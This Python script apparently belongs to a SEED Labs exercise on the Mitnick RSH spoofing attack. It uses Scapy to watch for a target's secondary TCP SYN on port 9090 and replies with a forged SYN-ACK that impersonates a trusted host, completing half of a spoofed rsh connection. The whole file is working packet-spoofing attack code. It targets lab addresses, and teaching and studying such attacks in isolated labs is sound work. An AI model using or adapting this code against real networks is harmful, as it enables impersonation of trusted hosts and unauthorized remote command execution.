#!/usr/bin/env python3
"""Answer the SEED RSH secondary TCP callback on port 9090.
Start this program first, then run rsh_first.py in another terminal.
Run: sudo docker exec -it seed-attacker python3 /volumes/rsh_second.py
"""
import os
from scapy.all import IP, TCP, send, sniff

TRUSTED_IP = "10.9.0.6"
TARGET_IP = "10.9.0.5"
IFACE = os.environ.get("LAB_IFACE", "br-6514365f0955")
CALLBACK_PORT = 9090
RESPONDER_ISN = 0x2000
handled = False


def on_callback_syn(packet):
    global handled
    if handled or not packet.haslayer(TCP):
        return
    tcp = packet[TCP]
    if tcp.flags != "S" or tcp.dport != CALLBACK_PORT:
        return
    handled = True
    print(f"[+] Second SYN detected, ISN={tcp.seq}; "
          f"client source port={tcp.sport}", flush=True)

    # Reply to the port ACTUALLY observed (1022 or 1023 in our captures).
    syn_ack = (
        IP(src=TRUSTED_IP, dst=TARGET_IP)
        / TCP(sport=CALLBACK_PORT, dport=tcp.sport,
              flags="SA", seq=RESPONDER_ISN,
              ack=(tcp.seq + 1) % (2**32))
    )
    send(syn_ack, verbose=False)
    print("[+] Second SYN-ACK sent; verify final ACK in Wireshark", flush=True)


if __name__ == "__main__":
    print(f"[*] Monitoring for RSH callback on {IFACE}...", flush=True)
    sniff(
        iface=IFACE,
        filter=(f"tcp and src host {TARGET_IP} and dst host {TRUSTED_IP} "
                f"and dst port {CALLBACK_PORT}"),
        prn=on_callback_syn,
        stop_filter=lambda _packet: handled,
        timeout=90,
        store=False,
    )
    print("[*] Callback monitoring finished", flush=True)
